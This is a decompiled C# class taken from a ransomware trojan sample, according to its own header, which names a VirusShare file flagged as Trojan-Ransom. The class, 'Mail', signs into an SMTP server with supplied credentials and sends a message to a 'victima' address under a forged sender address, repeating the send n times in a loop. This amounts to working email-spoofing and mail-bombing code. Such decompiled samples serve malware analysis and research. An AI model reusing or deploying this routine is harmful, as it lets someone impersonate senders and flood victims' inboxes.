// Decompiled with JetBrains decompiler
// Type: flu.Mail
// Assembly: flu-nucleo, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1FFD10A3-F795-4E6C-98F1-531878AC8FB2
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-95e0689d187b08f029efa892400fba3cceb7785a02a7c89bae7ec0db19434304.exe

using System.Net;
using System.Net.Mail;

namespace flu
{
  internal class Mail
  {
    private SmtpClient server;
    private string mailVictima;
    private string mailFake;
    private string text;
    private string subject;

    public Mail(
      string mailServer,
      string emailOrigen,
      string pass,
      string emailVictima,
      string emailFake,
      string asunto,
      string texto)
    {
      this.server = new SmtpClient(mailServer);
      this.server.Credentials = (ICredentialsByHost) new NetworkCredential(emailOrigen, pass);
      this.server.EnableSsl = true;
      this.mailVictima = emailVictima;
      this.mailFake = emailFake;
      this.text = texto;
      this.subject = asunto;
    }

    public void sendMail(int n)
    {
      MailMessage message = new MailMessage();
      message.Subject = this.subject;
      message.To.Add(new MailAddress(this.mailVictima));
      message.From = new MailAddress(this.mailFake, this.mailFake);
      message.Body = this.text;
      for (int index = 0; index < n; ++index)
        this.server.Send(message);
    }
  }
}
